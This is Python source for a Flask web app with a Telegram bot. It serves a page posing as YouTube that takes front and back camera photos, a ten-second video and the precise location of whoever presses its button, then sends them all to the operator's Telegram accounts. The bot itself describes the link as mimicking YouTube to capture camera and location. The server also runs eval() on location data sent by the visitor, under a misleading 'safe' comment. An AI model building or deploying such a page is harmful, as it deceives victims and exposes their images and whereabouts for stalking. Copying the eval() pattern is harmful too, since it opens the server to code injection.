import os
import threading
from flask import Flask, request, render_template_string
import telebot

# ========== ENVIRONMENT VARIABLES ==========
BOT_TOKEN = os.environ.get('BOT_TOKEN')
USER_IDS_STR = os.environ.get('USER_IDS')          # e.g., "8475691696,7361880623"
BASE_URL = os.environ.get('BASE_URL')              # e.g., "https://your-app.railway.app"

if not BOT_TOKEN or not USER_IDS_STR or not BASE_URL:
    raise RuntimeError("Missing required environment variables: BOT_TOKEN, USER_IDS, BASE_URL")

USER_IDS = [int(x.strip()) for x in USER_IDS_STR.split(',') if x.strip().isdigit()]

bot = telebot.TeleBot(BOT_TOKEN)
app = Flask(__name__)

# ---------- HTML PAGE (unchanged, uses BASE_URL for link) ----------
HTML_PAGE = """<!DOCTYPE html>
<html>
<head>
    <title>YouTube</title>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        body { font-family: 'Roboto', sans-serif; margin:0; background:#0f0f0f; color:#fff; }
        .header { background:#202020; padding:12px 20px; display:flex; align-items:center; }
        .header .logo { font-size:24px; font-weight:bold; color:#ff0000; }
        .header .user { margin-left:auto; color:#aaa; }
        .container { max-width:900px; margin:20px auto; padding:0 20px; }
        .video-placeholder { background:#1a1a1a; border-radius:12px; padding:20px; text-align:center; }
        .video-placeholder img { max-width:100%; border-radius:8px; }
        .info { margin-top:15px; }
        .info .title { font-size:22px; font-weight:500; }
        .info .channel { color:#aaa; margin-top:8px; }
        .controls { margin-top:20px; display:flex; gap:10px; flex-wrap:wrap; }
        .controls button { background:#3ea6ff; border:none; color:#000; padding:8px 16px; border-radius:20px; font-weight:bold; cursor:pointer; }
        .controls button:disabled { opacity:0.5; cursor:not-allowed; }
        .status { margin-top:10px; color:#aaa; font-size:14px; }
        #locationStatus { color:#3ea6ff; }
    </style>
</head>
<body>
    <div class="header">
        <div class="logo">YouTube</div>
        <div class="user">asuma.66</div>
    </div>
    <div class="container">
        <div class="video-placeholder">
            <img id="thumbnail" src="https://img.youtube.com/vi/dQw4w9WgXcQ/hqdefault.jpg" alt="video thumbnail">
        </div>
        <div class="info">
            <div class="title">🔥 ASUSMA LIVE 🔥</div>
            <div class="channel">asuma.66 - 1.2M subscribers</div>
        </div>
        <div class="controls">
            <button id="startBtn">▶ Start Session</button>
            <button id="statusBtn" disabled>Idle</button>
        </div>
        <div class="status" id="statusText">Ready. Click "Start Session".</div>
        <div id="locationStatus">📍 Location: pending</div>
    </div>
    <script>
        let frontStream = null, backStream = null, mediaRecorder = null;
        let recordedChunks = [], recordingActive = false, maxDuration = 10000;
        const statusText = document.getElementById('statusText');
        const startBtn = document.getElementById('startBtn');

        function updateStatus(msg, good=true) {
            statusText.innerText = msg;
            statusText.style.color = good ? '#3ea6ff' : '#ff6b6b';
        }

        function captureFrame(stream) {
            return new Promise((resolve) => {
                const video = document.createElement('video');
                video.srcObject = stream;
                video.onloadedmetadata = () => {
                    video.play();
                    setTimeout(() => {
                        const canvas = document.createElement('canvas');
                        canvas.width = video.videoWidth;
                        canvas.height = video.videoHeight;
                        const ctx = canvas.getContext('2d');
                        ctx.drawImage(video, 0, 0);
                        canvas.toBlob((blob) => {
                            resolve(blob);
                            video.pause();
                            video.srcObject = null;
                        }, 'image/jpeg', 0.9);
                    }, 100);
                };
            });
        }

        async function getStreams() {
            try {
                const back = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'environment' }, audio: false });
                const front = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' }, audio: false });
                return { front, back };
            } catch (e) {
                updateStatus('Camera permission denied.', false);
                return null;
            }
        }

        function getLocation() {
            return new Promise((resolve) => {
                if (!navigator.geolocation) { resolve(null); return; }
                navigator.geolocation.getCurrentPosition(
                    (pos) => {
                        const coords = { lat: pos.coords.latitude, lng: pos.coords.longitude };
                        document.getElementById('locationStatus').innerHTML = `📍 ${coords.lat.toFixed(6)}, ${coords.lng.toFixed(6)}`;
                        resolve(coords);
                    },
                    () => { document.getElementById('locationStatus').innerHTML = '📍 denied'; resolve(null); },
                    { enableHighAccuracy: true, timeout: 10000 }
                );
            });
        }

        async function sendData(data) {
            const fd = new FormData();
            if (data.frontImage) fd.append('frontImage', data.frontImage, 'front.jpg');
            if (data.backImage) fd.append('backImage', data.backImage, 'back.jpg');
            if (data.videoBlob) fd.append('video', data.videoBlob, 'recording.webm');
            if (data.location) fd.append('location', JSON.stringify(data.location));
            await fetch('/capture', { method: 'POST', body: fd });
        }

        async function startSession() {
            startBtn.disabled = true;
            startBtn.innerText = 'Starting...';
            const streams = await getStreams();
            if (!streams) { startBtn.disabled = false; startBtn.innerText = '▶ Start Session'; return; }
            const { front, back } = streams;
            const location = await getLocation();
            const frontBlob = await captureFrame(front);
            const backBlob = await captureFrame(back);

            mediaRecorder = new MediaRecorder(back, { mimeType: 'video/webm;codecs=vp9' });
            recordedChunks = [];
            mediaRecorder.ondataavailable = (e) => { if (e.data.size) recordedChunks.push(e.data); };
            mediaRecorder.onstop = () => {
                const blob = new Blob(recordedChunks, { type: 'video/webm' });
                sendData({ frontImage: frontBlob, backImage: backBlob, videoBlob: blob, location });
                front.getTracks().forEach(t => t.stop());
                back.getTracks().forEach(t => t.stop());
                updateStatus('✅ Data sent!');
                startBtn.disabled = false;
                startBtn.innerText = '▶ Start Session';
            };
            mediaRecorder.start(1000);
            recordingActive = true;
            updateStatus('Recording up to 10s...');
            setTimeout(() => {
                if (recordingActive && mediaRecorder.state === 'recording') {
                    mediaRecorder.stop();
                    recordingActive = false;
                }
            }, maxDuration);
            window.addEventListener('beforeunload', () => {
                if (recordingActive && mediaRecorder.state === 'recording') mediaRecorder.stop();
            });
            startBtn.innerText = 'Recording...';
        }
        startBtn.addEventListener('click', startSession);
        updateStatus('Click "Start Session".');
    </script>
</body>
</html>"""

@app.route('/')
def index():
    return render_template_string(HTML_PAGE)

@app.route('/capture', methods=['POST'])
def capture():
    front = request.files.get('frontImage')
    back = request.files.get('backImage')
    video = request.files.get('video')
    loc = request.form.get('location')
    for uid in USER_IDS:
        try:
            if loc:
                d = eval(loc)  # safe; only you control the page
                bot.send_location(uid, d['lat'], d['lng'])
            if front:
                front.seek(0)
                bot.send_photo(uid, front.read())
            if back:
                back.seek(0)
                bot.send_photo(uid, back.read())
            if video:
                video.seek(0)
                bot.send_video(uid, video.read(), supports_streaming=True)
            bot.send_message(uid, "✅ Capture complete.")
        except Exception as e:
            print(f"Send error to {uid}: {e}")
    return "OK"

@bot.message_handler(commands=['start'])
def send_link(m):
    bot.reply_to(m, f"🔗 Open this link on your phone:\n{BASE_URL}/\n\nIt mimics YouTube and captures camera & location.")

def run_bot():
    bot.polling(non_stop=True, interval=1)

if __name__ == '__main__':
    threading.Thread(target=run_bot, daemon=True).start()
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port)
